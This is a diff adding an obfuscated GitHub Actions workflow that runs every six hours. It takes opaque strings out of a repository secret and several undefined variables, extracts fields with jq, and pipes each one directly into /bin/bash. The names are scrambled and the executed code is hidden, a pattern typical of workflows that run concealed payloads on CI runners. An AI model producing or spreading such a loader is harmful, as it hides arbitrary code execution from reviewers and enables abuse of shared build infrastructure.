@@ -1,0 +1,20 @@
+name: yindatian4323
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yindatian4323
+        env:
+          z6: ${{ secrets.z6 }}
+        run: |
+          echo $z6 | jq -r .sbkt27978 | /bin/bash
+          echo $cat3770 | jq -r .uiqi27955 | /bin/bash
+          echo $vlj58140 | jq -r .jy72 | /bin/bash
+          echo $zfsgh21581 | jq -r .aqtim9 | /bin/bash
+
